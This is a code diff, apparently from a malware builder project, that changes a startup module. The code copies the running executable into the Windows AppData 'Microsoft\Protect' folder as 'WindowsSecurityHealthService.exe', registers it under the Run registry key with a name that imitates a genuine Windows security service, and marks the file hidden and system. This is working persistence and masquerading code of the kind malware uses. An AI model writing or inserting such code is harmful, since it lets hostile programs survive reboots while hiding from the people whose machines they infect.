new builder and organization of functions

+++ src/modules/startup/startup.js
@@ -5,23 +5,27 @@ const program = require('../../utils/program/program.js');
 
 module.exports = async () => {
     try {
-        const exePath = process.execPath;
+        const exePath = await program.CurrentAppPath();
+        if (exePath === 'Not Found') {
+            return
+        }
+
         const targetPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect', 'WindowsSecurityHealthService.exe');
         
         if (fs.existsSync(targetPath)) {
             fs.unlinkSync(targetPath);
         }
 
-        await program.setRegistryValue({
+        await program.SetRegistryValue({
             keyPath: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
-            name: 'Windows Security Health Service P',
+            name: 'Windows Security Health Service',
             type: 'REG_SZ',
             value: targetPath
-        });
+        })
 
         fs.copyFileSync(exePath, targetPath);
 
-        await program.execCommand(`attrib +h +s "${targetPath}"`);
+        await program.ExecCommand(`attrib +h +s "${targetPath}"`);
     } catch (error) {
         console.error(error);
     }
